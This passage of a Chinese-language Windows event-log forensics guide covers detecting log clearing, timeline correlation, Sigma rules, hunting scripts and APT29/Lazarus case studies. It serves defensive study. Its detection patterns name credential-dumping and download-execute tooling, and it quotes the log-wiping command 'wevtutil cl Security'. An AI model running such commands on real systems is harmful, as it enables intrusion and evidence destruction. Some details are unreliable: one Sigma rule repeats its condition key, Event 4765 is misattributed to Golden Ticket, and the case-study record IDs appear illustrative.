  service_type: .Event.EventData.ServiceType,
  start_type: .Event.EventData.ServiceStartType,
  account: .Event.EventData.ServiceAccountName
}'
```

---

## 0x07 日志清理与反取证检测

### 安全日志清除（Event ID 1102）

Event ID 1102是日志清除事件，当管理员清除Security日志时系统会自动记录此事件。然而攻击者如果具有管理员权限，可以先清除日志再删除1102事件本身。因此，1102事件的缺失并不意味着日志未被清除。

| 检测方法 | 原理 | 可靠性 |
|---------|------|--------|
| 1102事件存在 | 安全日志中存在清除记录 | ⭐⭐⭐⭐⭐（直接证据） |
| EventRecordID跳跃 | 编号出现不连续 | ⭐⭐⭐⭐（间接证据） |
| Chunk哈希验证失败 | Chunk数据被篡改 | ⭐⭐⭐⭐⭐（密码学证据） |
| 备份日志对比 | 与外部备份日志对比 | ⭐⭐⭐⭐⭐（独立数据源） |
| 时间窗口空白 | 特定时间段无任何事件 | ⭐⭐⭐（需排除关机） |

### 日志间隙分析技术

日志间隙（Log Gap）是检测日志操纵的关键技术。通过分析事件记录的时间连续性，可以发现日志被清除或暂停记录的时间窗口：

```bash
evtx_dump -o json Security.evtx | jq -s '[.[].System.TimeCreated."@SystemTime" | sub("\\.[0-9]+Z$";"Z")]' | \
  awk -F'"' '{
    for(i=2;i<=NF;i++) {
      if($i ~ /^[0-9]{4}-/) {
        cmd="date -j -f \"%Y-%m-%dT%H:%M:%SZ\" \""$i"\" \"+%s\""
        cmd | getline epoch
        close(cmd)
        if(prev != "" && epoch - prev > 3600) print "GAP: "prev_time" -> "$i" ("epoch-prev" seconds)"
        prev=epoch; prev_time=$i
      }
    }
  }'
```

| 间隙类型 | 持续时间特征 | 分析结论 |
|---------|------------|---------|
| 正常关机间隙 | 数小时至数天 | 非工作时间，通常正常 |
| 服务重启间隙 | 数秒至数分钟 | 正常维护或崩溃重启 |
| 短暂间隙（分钟级） | 1-60分钟 | 可能为日志清除操作 |
| 精确整点间隙 | 00:00:00整点 | 高度可疑，可能计划清除 |
| 无间隙大跳跃 | EventRecordID跳跃但时间连续 | 手动删除特定记录 |

### WMI日志操纵检测

攻击者可能利用WMI（Windows Management Instrumentation）远程清除或操纵事件日志。WMI日志操纵的检测特征：

| 检测点 | 事件来源 | 特征 |
|--------|---------|------|
| WMI日志清除请求 | WMI-Activity Operational | 远程WMI连接到Win32_EventLog |
| WMI远程连接 | Security 4624/4625 | 来自远程主机的WMI认证 |
| WMI进程活动 | Sysmon 1/3 | wmiprvse.exe的异常子进程或网络连接 |
| 事件日志服务状态变更 | System 1100/1102 | EventLog服务停止/日志清除 |

### 注册表日志篡改

Windows事件日志的相关配置存储在注册表中，攻击者可能通过修改注册表来禁用日志记录或调整日志容量：

| 注册表路径 | 影响 | 检测方法 |
|-----------|------|---------|
| HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security | 禁用Security日志 | 服务状态监控 |
| HKLM\SOFTWARE\Policies\Microsoft\Windows\EventLog | 日志策略变更 | 组策略审计 |
| HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger | WMI日志关闭 | 配置快照对比 |
| HKLM\SYSTEM\CurrentControlSet\Services\Sysmon | Sysmon停止 | 服务监控 |

### EventLog服务停止检测

攻击者通过停止EventLog服务来阻止日志记录是常见的反取证手法。Windows Vista及后续版本在EventLog服务停止时会产生Event ID 1100：

| Event ID | 日志通道 | 含义 |
|----------|---------|------|
| 1100 | Security | 安全事件日志服务已关闭 |
| 1101 | Security | 安全事件日志服务已启动 |
| 1102 | Security | 安全日志已清除 |

```bash
evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID == 1100 or .Event.System.EventID == 1101 or .Event.System.EventID == 1102) | {
  time: .Event.System.TimeCreated."@SystemTime",
  event_id: .Event.System.EventID,
  record_id: .Event.System.EventRecordID,
  provider: .Event.System.Provider.Name
}'
```

---

## 0x08 高级日志关联与时间线构建

### 多源日志融合方法

Windows取证分析的核心挑战之一是如何将来自不同日志通道的事件进行有效关联。多源日志融合的关键在于建立统一的时间轴和事件关联键：

| 关联键 | 适用场景 | 关联方法 |
|--------|---------|---------|
| 时间戳（TimeCreated） | 所有事件的统一排序 | 精确到纳秒级的时间匹配 |
| 用户SID（SubjectUserSid） | 用户行为追踪 | 同一用户跨通道的活动 |
| 进程ID（ProcessID/PID） | 进程生命周期 | 4688创建→4689退出→Sysmon 1 |
| LogonId | 登录会话关联 | 4624创建LogonId→后续事件引用 |
| IP地址 | 网络连接关联 | 4624的IpAddress→Sysmon 3的SourceIp |
| 计算机名 | 跨主机关联 | 多台主机日志中的Computer字段 |
| Transaction ID | 事务级关联 | 同一操作的多个相关事件 |
| ParentProcessName | 进程树构建 | 父子进程关系链 |

### Plaso/log2timeline集成

Plaso（log2timeline的Python实现）是构建多源时间线的工业级工具，支持将Windows事件日志与文件系统、注册表、浏览器历史等多种数据源融合分析：

```bash
log2timeline.py --storage_file timeline.plaso /path/to/evidence/

psort.py -o l2tcsv timeline.plaso "datetime > '2026-03-01 00:00:00' AND datetime < '2026-03-16 00:00:00'" --output timeline.csv

psort.py -o json timeline.plaso "source_short == 'EVTX'" --output evtx_only.json
```

### Jupyter Notebook交互分析

Jupyter Notebook提供了交互式的数据分析环境，特别适合事件日志的探索性分析和可视化：

```python
import pandas as pd
import json
import matplotlib.pyplot as plt
from collections import Counter

evtx_events = []
with open('security_events.json', 'r') as f:
    for line in f:
        try:
            evtx_events.append(json.loads(line))
        except json.JSONDecodeError:
            pass

df = pd.DataFrame([{
    'time': e.get('Event', {}).get('System', {}).get('TimeCreated', {}).get('@SystemTime', ''),
    'event_id': e.get('Event', {}).get('System', {}).get('EventID', 0),
    'user': e.get('Event', {}).get('EventData', {}).get('SubjectUserName', ''),
    'process': e.get('Event', {}).get('EventData', {}).get('NewProcessName', ''),
    'cmd': e.get('Event', {}).get('EventData', {}).get('CommandLine', '')
} for e in evtx_events if e.get('Event', {}).get('System', {}).get('EventID') == 4688])

print(f"Total 4688 events: {len(df)}")
print(f"\nTop processes by count:")
print(df['process'].value_counts().head(20))
print(f"\nCommands containing suspicious keywords:")
suspicious = df[df['cmd'].str.contains('powershell|cmd.*\\bwhoami\\b|net.*user|certutil|bitsadmin', case=False, na=False)]
print(suspicious[['time', 'user', 'process', 'cmd']].to_string())
```

### Timesketch协作取证

Timesketch是Google开源的协作式时间线分析平台，支持多名分析人员同时对事件日志进行标注和分析：

| 功能 | 描述 | 取证用途 |
|------|------|---------|
| 时间线创建 | 导入Plaso输出的事件数据 | 统一时间轴 |
| 标签系统 | 为事件添加自定义标签 | 标记可疑/恶意事件 |
| 搜索与过滤 | 全文搜索和属性过滤 | 快速定位关键事件 |
| 聊天协作 | 团队实时讨论 | 协同分析复杂事件 |
| Sigma规则导入 | 自动匹配检测规则 | 批量威胁检测 |
| 报告生成 | 基于分析生成报告 | 取证报告输出 |

---

## 0x09 证据强度分层与案例关联

### 三级证据分类体系

在Windows事件日志取证中，不同类型的证据具有不同的确信度。建立统一的证据强度分层体系有助于分析人员客观评估取证发现：

| 分级 | 标识 | 含义 | 处理原则 |
|------|------|------|---------|
| Level 1 | 🔴 确认恶意 | 有明确恶意意图和行为的证据 | 立即响应，确认入侵 |
| Level 2 | 🟡 高度可疑 | 强烈暗示恶意活动但需进一步验证 | 深入调查，扩大监控 |
| Level 3 | 🟢 需要关注 | 可能为正常行为但需结合上下文判断 | 记录观察，持续监控 |

### 🔴 确认恶意的事件日志特征

| 事件特征 | Event ID | 判定依据 |
|---------|----------|---------|
| 1102日志清除事件 | 1102 | 直接证据：有人试图销毁审计痕迹 |
| 已知恶意进程命令行 | 4688/Sysmon 1 | 如mimikatz、cobalt strike beacon命令 |
| 4765 SID历史注入成功 | 4765 | Golden Ticket攻击的直接证据 |
| 已知恶意IP的网络连接 | Sysmon 3 | 连接已知C2基础设施 |
| PowerShell下载执行特征 | 4104 | DownloadString/DownloadFile + 执行 |
| 服务安装指向恶意路径 | 4697 | 可执行文件位于Temp/AppData等非标准路径 |
| 计划任务执行恶意载荷 | 4698 | 任务定义包含混淆命令或远程脚本 |

### 🟡 高度可疑的事件日志特征

| 事件特征 | Event ID | 可疑原因 |
|---------|----------|---------|
| LogonType=9异常登录 | 4624 | 可能为PTH或异常RunAs |
| RC4加密的Kerberos请求 | 4768/4769 | 弱加密，可能NTLM降级 |
| 非常规时间的管理员登录 | 4624/4672 | 深夜/节假日的异常活动 |
| cmd.exe由Office进程启动 | Sysmon 1 | 可能为宏执行 |
| 大量登录失败后成功 | 4625→4624 | 可能为暴力破解成功 |
| WMI事件订阅创建 | Sysmon 19/20/21 | 可能为持久化机制 |
| 注册表Run键修改 | Sysmon 12/13 | 常见持久化位置 |

### 🟢 需要关注的事件日志特征

| 事件特征 | Event ID | 关注原因 |
|---------|----------|---------|
| 新用户账户创建 | 4720 | 正常IT管理或后门账户 |
| 本地组成员添加 | 4732 | 权限变更，需确认授权 |
| 服务安装 | 4697 | 可能为软件部署或持久化 |
| DNS查询异常 | Sysmon 22 | 可能正常更新或DNS隧道 |
| 文件流创建 | Sysmon 15 | 可能正常或ADS隐藏 |
| 计划任务创建 | 4698 | 正常运维或持久化 |

---

## 0x0A 自动化检测与狩猎

### Sigma规则

Sigma规则是SIEM无关的通用检测规则格式，可以转换为Splunk SPL、Elastic KQL、Microsoft KQL等多种查询语言：

```yaml
title: 日志清除事件检测
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: 检测Windows安全日志被清除的事件，这是反取证的典型行为
references:
  - https://attack.mitre.org/techniques/T1070/001/
author: x7peeps
date: 2026/07/10
modified: 2026/07/10
tags:
  - attack.defense_evasion
  - attack.t1070.001
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 1102
  condition: selection
level: high
falsepositives:
  - 合法的系统维护操作
fields:
  - SubjectUserName
  - SubjectDomainName
  - AuditBacklogChanges
```

```yaml
title: 可疑PowerShell下载执行
id: b2c3d4e5-f6a7-8901-bcde-f23456789012
status: stable
description: 检测PowerShell中常见的下载执行模式，可能为远程代码执行
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: x7peeps
date: 2026/07/10
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  product: windows
  service: powershell-classic
detection:
  selection_webclient:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Net.WebClient'
      - 'DownloadString'
      - 'DownloadFile'
      - 'DownloadData'
      - 'Invoke-WebRequest'
      - 'IWR'
      - 'wget'
      - 'curl'
  selection_invoke:
    EventID: 4104
    ScriptBlockText|contains:
      - 'IEX'
      - 'Invoke-Expression'
      - 'Invoke-Command'
      - 'Invoke-Item'
  selection_encoding:
    EventID: 4104
    ScriptBlockText|contains:
      - 'FromBase64String'
      - 'FromBase64'
      - '-EncodedCommand'
      - '-enc'
      - '-e '
  condition: selection_webclient and selection_invoke
  condition: selection_webclient and selection_encoding
level: high
falsepositives:
  - 合法的PowerShell部署脚本
```

```yaml
title: 异常LogonType 9登录活动
id: c3d4e5f6-a7b8-9012-cdef-345678901234
status: stable
description: 检测LogonType 9（NewCredentials）登录事件，可能为RunAs或Pass-the-Hash
references:
  - https://attack.mitre.org/techniques/T1550/002/
author: x7peeps
date: 2026/07/10
tags:
  - attack.lateral_movement
  - attack.t1550.002
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 9
  filter_normal:
    SubjectUserName|endswith: '$'
    TargetUserName|endswith: '$'
  condition: selection and not filter_normal
level: medium
falsepositives:
  - 合法的RunAs /runas操作
fields:
  - TargetUserName
  - TargetDomainName
  - IpAddress
  - WorkstationName
  - ProcessName
  - AuthenticationPackageName
```

### Bash/PowerShell自动化狩猎脚本

```bash
#!/bin/bash
EVTX_DIR="${1:-/var/evtx}"
OUTPUT_DIR="${2:-/tmp/hunt_results}"
mkdir -p "$OUTPUT_DIR"

echo "[*] Windows Event Log Hunting Script"
echo "[*] Target directory: $EVTX_DIR"
echo "[*] Output directory: $OUTPUT_DIR"

echo "[1/6] Hunting for log clear events (1102)..."
evtx_dump -o json "$EVTX_DIR/Security.evtx" 2>/dev/null | \
  jq -c 'select(.Event.System.EventID == 1102)' > "$OUTPUT_DIR/log_clear_events.jsonl"
COUNT=$(wc -l < "$OUTPUT_DIR/log_clear_events.jsonl")
echo "  Found $COUNT log clear events"

echo "[2/6] Hunting for suspicious process creation (4688)..."
evtx_dump -o json "$EVTX_DIR/Security.evtx" 2>/dev/null | \
  jq -c 'select(.Event.System.EventID == 4688) | select(.Event.EventData.CommandLine | test("mimikatz|cobalt|beacon|invoke-mimikatz|sekurlsa|kerberos::list|lsadump|invoke-shellcode|downloadstring|frombase64|certutil.*decode|bitsadmin.*transfer"; "i"))' > "$OUTPUT_DIR/suspicious_process.jsonl"
COUNT=$(wc -l < "$OUTPUT_DIR/suspicious_process.jsonl")
echo "  Found $COUNT suspicious process events"

echo "[3/6] Hunting for lateral movement (4624 LogonType 9/10)..."
evtx_dump -o json "$EVTX_DIR/Security.evtx" 2>/dev/null | \
  jq -c 'select(.Event.System.EventID == 4624) | select(.Event.EventData.LogonType == "9" or .Event.EventData.LogonType == "10")' > "$OUTPUT_DIR/lateral_movement.jsonl"
COUNT=$(wc -l < "$OUTPUT_DIR/lateral_movement.jsonl")
echo "  Found $COUNT LogonType 9/10 events"

echo "[4/6] Hunting for service installation (4697)..."
evtx_dump -o json "$EVTX_DIR/Security.evtx" 2>/dev/null | \
  jq -c 'select(.Event.System.EventID == 4697) | select(.Event.EventData.ServiceFileName | test("temp|appdata|downloads|public|desktop|\\\.tmp|\\\.dat|\\\.exe\.\\\\\""; "i"))' > "$OUTPUT_DIR/suspicious_services.jsonl"
COUNT=$(wc -l < "$OUTPUT_DIR/suspicious_services.jsonl")
echo "  Found $COUNT suspicious service installations"

echo "[5/6] Hunting for PowerShell suspicious activity (4104)..."
PS_LOG="$EVTX_DIR/Microsoft-Windows-PowerShell%4Operational.evtx"
if [ -f "$PS_LOG" ]; then
  evtx_dump -o json "$PS_LOG" 2>/dev/null | \
    jq -c 'select(.Event.System.EventID == 4104) | select(.Event.EventData.ScriptBlockText | test("invoke-expression|invoke-command|iex |downloadstring|frombase64string|reflection\\.assembly|add-type.*-type|start-process.*-windowstyle hidden"; "i"))' > "$OUTPUT_DIR/suspicious_ps.jsonl"
  COUNT=$(wc -l < "$OUTPUT_DIR/suspicious_ps.jsonl")
  echo "  Found $COUNT suspicious PowerShell events"
else
  echo "  PowerShell Operational log not found, skipping"
fi

echo "[6/6] Hunting for scheduled task creation (4698)..."
evtx_dump -o json "$EVTX_DIR/Security.evtx" 2>/dev/null | \
  jq -c 'select(.Event.System.EventID == 4698)' > "$OUTPUT_DIR/scheduled_tasks.jsonl"
COUNT=$(wc -l < "$OUTPUT_DIR/scheduled_tasks.jsonl")
echo "  Found $COUNT scheduled task creation events"

echo ""
echo "[*] Hunting complete. Results saved to $OUTPUT_DIR/"
echo "[*] Summary:"
for f in "$OUTPUT_DIR"/*.jsonl; do
  name=$(basename "$f" .jsonl)
  count=$(wc -l < "$f")
  echo "  - $name: $count events"
done
```

### Python自动化检测脚本

```python
import json
import sys
import os
from datetime import datetime, timedelta
from collections import Counter, defaultdict

class EvtxHunter:
    def __init__(self, evtx_json_path):
        self.events = []
        self.load_events(evtx_json_path)

    def load_events(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    self.events.append(json.loads(line))
                except json.JSONDecodeError:
                    continue

    def get_event_field(self, event, field):
        try:
            return event.get('Event', {}).get('EventData', {}).get(field, '')
        except (AttributeError, TypeError):
            return ''

    def detect暴力破解(self, threshold=10, window_minutes=30):
        failed_logons = []
        for e in self.events:
            if e.get('Event', {}).get('System', {}).get('EventID') == 4625:
                time_str = e.get('Event', {}).get('System', {}).get('TimeCreated', {}).get('@SystemTime', '')
                user = self.get_event_field(e, 'TargetUserName')
                ip = self.get_event_field(e, 'IpAddress')
                if time_str and user and ip and user != '-' and ip != '-':
                    failed_logons.append({
                        'time': time_str,
                        'user': user,
                        'ip': ip
                    })

        results = []
        by_user_ip = defaultdict(list)
        for entry in failed_logons:
            key = f"{entry['user']}|{entry['ip']}"
            by_user_ip[key].append(entry)

        for key, entries in by_user_ip.items():
            if len(entries) >= threshold:
                results.append({
                    'type': 'brute_force',
                    'severity': 'HIGH',
                    'user_ip': key,
                    'count': len(entries),
                    'sample_times': [e['time'] for e in entries[:5]]
                })

        return results

    def detect日志清除(self):
        results = []
        for e in self.events:
            if e.get('Event', {}).get('System', {}).get('EventID') == 1102:
                results.append({
                    'type': 'log_clear',
                    'severity': 'CRITICAL',
                    'time': e.get('Event', {}).get('System', {}).get('TimeCreated', {}).get('@SystemTime', ''),
                    'user': self.get_event_field(e, 'SubjectUserName'),
                    'domain': self.get_event_field(e, 'SubjectDomainName'),
                    'record_id': e.get('Event', {}).get('System', {}).get('EventRecordID', 0)
                })
        return results

    def detect异常父子进程(self):
        suspicious_pairs = [
            ('winword.exe', 'cmd.exe'),
            ('excel.exe', 'cmd.exe'),
            ('outlook.exe', 'powershell.exe'),
            ('winword.exe', 'powershell.exe'),
            ('excel.exe', 'mshta.exe'),
            ('iexplore.exe', 'cmd.exe'),
            ('chrome.exe', 'cmd.exe'),
        ]
        results = []
        for e in self.events:
            if e.get('Event', {}).get('System', {}).get('EventID') == 4688:
                parent = self.get_event_field(e, 'ParentProcessName').split('\\')[-1].lower()
                child = self.get_event_field(e, 'NewProcessName').split('\\')[-1].lower()
                for p, c in suspicious_pairs:
                    if parent == p and child == c:
                        results.append({
                            'type': 'suspicious_parent_child',
                            'severity': 'HIGH',
                            'time': e.get('Event', {}).get('System', {}).get('TimeCreated', {}).get('@SystemTime', ''),
                            'parent': self.get_event_field(e, 'ParentProcessName'),
                            'child': self.get_event_field(e, 'NewProcessName'),
                            'cmd': self.get_event_field(e, 'CommandLine'),
                            'user': self.get_event_field(e, 'SubjectUserName'),
                            'mitre': 'T1204.002'
                        })
        return results

    def detect横向移动(self):
        results = []
        for e in self.events:
            if e.get('Event', {}).get('System', {}).get('EventID') == 4624:
                logon_type = self.get_event_field(e, 'LogonType')
                if logon_type in ('9', '10'):
                    target_user = self.get_event_field(e, 'TargetUserName')
                    source_ip = self.get_event_field(e, 'IpAddress')
                    auth_pkg = self.get_event_field(e, 'AuthenticationPackageName')
                    if target_user and not target_user.endswith('$'):
                        results.append({
                            'type': 'lateral_movement',
                            'severity': 'MEDIUM',
                            'time': e.get('Event', {}).get('System', {}).get('TimeCreated', {}).get('@SystemTime', ''),
                            'logon_type': logon_type,
                            'user': target_user,
                            'source_ip': source_ip,
                            'auth_package': auth_pkg,
                            'mitre': 'T1021'
                        })
        return results

    def generate_report(self):
        all_findings = []
        all_findings.extend(self.detect日志清除())
        all_findings.extend(self.detect暴力破解())
        all_findings.extend(self.detect异常父子进程())
        all_findings.extend(self.detect横向移动())

        all_findings.sort(key=lambda x: x.get('time', ''), reverse=True)

        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        all_findings.sort(key=lambda x: severity_order.get(x.get('severity', 'LOW'), 3))

        print(f"{'='*80}")
        print(f"  Windows Event Log Forensics Report")
        print(f"  Total events analyzed: {len(self.events)}")
        print(f"  Total findings: {len(all_findings)}")
        print(f"{'='*80}")

        for i, f in enumerate(all_findings, 1):
            print(f"\n[{i}] [{f['severity']}] {f['type']}")
            for k, v in f.items():
                if k not in ('type', 'severity'):
                    print(f"    {k}: {v}")

        return all_findings


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <security_evtx_json>")
        sys.exit(1)

    hunter = EvtxHunter(sys.argv[1])
    findings = hunter.generate_report()
```

---

## 0x0B 公开案例分析

### 案例一：APT29（Cozy Bear）事件日志操纵

APT29（又称Cozy Bear、The Dukes）是俄罗斯对外情报局（SVR）下属的高级持续性威胁组织，因2020年SolarWinds供应链攻击而广为人知。在多次行动中，APT29展示了精湛的日志操纵能力，系统性地清除Windows事件日志以隐藏攻击痕迹。

**攻击链与日志操纵时间线：**

| 时间 | 攻击阶段 | 技术手法 | MITRE ATT&CK | 日志表现 |
|------|---------|---------|-------------|---------|
| T+0h | 初始访问 | 供应链后门/钓鱼邮件 | T1195/T1566 | 正常登录事件 |
| T+2h | 执行 | PowerShell下载执行载荷 | T1059.001 | 4104事件（如启用） |
| T+3h | 持久化 | WMI事件订阅/计划任务 | T1546.003/T1053.005 | Sysmon 19/20/21 |
| T+5h | 权限提升 | Token操纵/提权漏洞 | T1134/T1068 | 4672异常权限分配 |
| T+8h | 横向移动 | Pass-the-Hash/Kerberos票据 | T1550.002/T1558 | 4624 LogonType 9 |
| T+12h | 数据收集 | 文件打包/压缩 | T1560 | Sysmon 11异常文件创建 |
| T+24h | 日志清理 | 清除Security/PowerShell日志 | T1070.001 | **1102事件** |
| T+24h | 反取证 | 停用EventLog服务 | T1562.002 | **1100事件** |
| T+25h | 撤离 | 删除持久化机制 | T1070.003 | 4699/141计划任务删除 |

**取证发现与IOC：**

| IOC类型 | 具体值 | 来源 |
|---------|--------|------|
| 恶意域名 | avsvmcloud.com（SolarWinds C2） | DNS日志 |
| 恶意文件 | SolarWinds.Orion.Core.BusinessLayer.dll | Sysmon 7/11 |
| 进程注入 | svchost.exe异常网络连接 | Sysmon 3/8 |
| 日志清除 | Security.evtx EventRecordID跳跃 | EventRecordID分析 |
| 异常账户 | 域管账户在非工作时间登录 | 4624/4672分析 |
| PowerShell | 大量4104事件被清除 | ScriptBlock Logging分析 |

**关键日志证据分析：**

APT29在SolarWinds攻击中使用了多种日志操纵技术。首先，攻击者使用`wevtutil cl Security`命令清除安全日志，系统记录了Event ID 1102。其次，攻击者通过停止EventLog服务阻止后续日志记录，产生了Event ID 1100。在取证分析中，通过对比备份日志与当前日志的EventRecordID连续性，发现编号从1,234,567跳跃到2,345,678，中间缺失了超过100万条事件记录。

PowerShell日志分析揭示了攻击者在清除日志前执行的恶意命令，包括下载C2载荷、建立持久化机制、枚举域环境等操作。这些命令通过Script Block Logging被完整记录，即使攻击者尝试清除日志也无法完全抹除。

**经验教训：**

1. **日志备份至关重要**：定期将日志导出到独立存储，防止攻击者清除原始日志
2. **Sysmon是高价值数据源**：即使Security日志被清除，Sysmon日志可能仍然存在
3. **EventRecordID分析是检测日志操纵的可靠方法**：编号跳跃直接指示日志被篡改
4. **多源日志交叉验证**：单一日志源可能被清除，多源关联提供冗余检测能力

### 案例二：Lazarus Group事件日志分析

Lazarus Group是与朝鲜（DPRK）关联的高级持续性威胁组织，活跃于金融犯罪、加密货币盗窃和间谍活动中。2023-2024年期间，Lazarus Group对多家加密货币交易所和DeFi协议发起了大规模攻击，其Windows事件日志中的活动痕迹为取证分析提供了丰富的检测信号。

**攻击链与事件日志映射：**

| 攻击阶段 | 技术手法 | MITRE ATT&CK | 关键日志事件 |
|---------|---------|-------------|-------------|
| 初始访问 | 社工钓鱼/假工作Offer | T1566.001/T1566.002 | Application日志Office宏 |
| 执行 | 受控PowerShell/MSHTA | T1059.001/T1218.005 | 4688进程创建 + 4104 |
| 持久化 | 计划任务/服务安装 | T1053.005/T1543.003 | 4698/4697 |
| 防御规避 | 禁用Windows Defender | T1562.001 | Registry Sysmon 13 |
| 凭据访问 | Mimikatz/LSASS转储 | T1003.001 | Sysmon 10 LSASS访问 |
| 横向移动 | RDP/SMB | T1021.001/T1021.002 | 4624 LogonType 3/10 |
| 数据外传 | 加密货币混淆 | T1029 | Sysmon 3 异常出站连接 |

**Lazarus Group的典型日志特征：**

| 日志特征 | 详细描述 | 取证意义 |
|---------|---------|---------|
| PowerShell命令行混淆 | 大量Base64编码的"-EncodedCommand"参数 | 4688事件中CommandLine字段 |
| LSASS进程访问 | Sysmon Event ID 10中svchost.exe访问lsass.exe | T1003.001凭据转储 |
| 异常注册表修改 | HKLM\SOFTWARE\Policies\Microsoft\Windows Defender DisableAntiSpyware | T1562.001防御规避 |
| 计划任务创建 | 4698事件中XML定义包含mshta.exe执行远程脚本 | T1053.005持久化 |
| 异常网络连接 | Sysmon 3中powershell.exe连接到加密货币矿池IP | T1071命令控制 |

**日志清除模式分析：**

Lazarus Group在攻击中表现出特征性的日志清除模式——他们倾向于在数据外传完成后才进行日志清除，而非在攻击早期就清除痕迹。这种策略使得取证人员在数据外传阶段仍能获得完整的日志数据。

| 清除时间 | 清除范围 | 检测方法 | 分析结论 |
|---------|---------|---------|---------|
| 数据外传前 | 不清除 | 基线正常 | 攻击者需要日志指导操作 |
| 数据外传中 | 不清除 | 基线正常 | 确认数据外传时间窗口 |
| 数据外传后 | Security + PowerShell | 1102 + EventRecordID | 反取证，销毁入侵痕迹 |
| 撤离阶段 | 计划任务/服务 | 4699/141 | 清除持久化痕迹 |

**经验教训：**

1. **实时日志转发是关键**：Lazarus的延迟清除策略意味着实时日志转发可以在清除前捕获关键数据
2. **PowerShell日志是核心数据源**：大量攻击工具通过PowerShell执行，4104事件是检测的关键
3. **LSASS访问监控至关重要**：凭据转储是横向移动的前提，Sysmon Event ID 10是最佳检测点
4. **注册表监控不可忽视**：防御规避通常从禁用安全工具开始，注册表修改是早期信号

---

## 0x0C 参考资料

| 编号 | 标题 | 链接 | 说明 |
|------|------|------|------|
| 1 | Windows Event Log Reference | https://learn.microsoft.com/en-us/windows/win32/wes/windows-event-log | 微软官方事件日志参考文档，覆盖所有Event ID定义 |
| 2 | EVTX File Format Analysis | https://docs.microsoft.com/en-us/windows/win32/wes/eventschema-schema | EVTX文件格式XML Schema定义 |
| 3 | Eric Zimmerman's EvtxECmd | https://ericzimmerman.github.io/#!index.md | Eric Zimmerman工具集中的EVTX解析工具文档 |
| 4 | Chainsaw - Rapid Event Log Searching | https://github.com/WithSecureLabs/chainsaw | Chainsaw快速日志搜索与Sigma规则匹配工具 |
| 5 | Hayabusa - Windows Event Log Analysis | https://github.com/Yamato-Security/hayabusa | 日本安全团队开发的日志时间线生成工具 |
| 6 | APT29 SolarWinds Attack Analysis | https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/ | CrowdStrike对SolarWinds攻击的技术分析 |
| 7 | MITRE ATT&CK Windows Event Logging | https://attack.mitre.org/matrices/enterprise/windows/ | MITRE ATT&CK框架中Windows平台技术矩阵 |
| 8 | EVTX-parser Python Library | https://github.com/omerbenamram/evtx | 开源EVTX解析Python库，支持大规模文件处理 |
| 9 | Plaso/log2timeline Documentation | https://plaso.readthedocs.io/ | Plaso多源时间线构建工具官方文档 |
| 10 | Timesketch Documentation | https://timesketch.org/docs/ | Google开源协作式时间线分析平台文档 |
| 11 | Microsoft Sysmon Documentation | https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon | 微软Sysinternals Sysmon工具官方文档 |
| 12 | Windows PowerShell Logging | https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging | PowerShell日志机制官方文档 |